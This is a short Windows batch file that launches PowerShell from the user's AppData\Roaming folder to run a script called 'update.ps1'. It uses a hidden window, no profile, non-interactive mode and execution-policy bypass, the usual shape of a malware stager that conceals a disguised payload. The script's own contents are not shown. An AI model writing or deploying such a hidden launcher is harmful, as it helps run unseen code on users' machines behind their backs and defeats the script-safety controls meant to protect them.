@echo off
powershell -Command "& {cd "$env:userprofile\AppData\Roaming"; powershell -w h -NoP -NonI -Ep Bypass -File "update.ps1"}"
pause
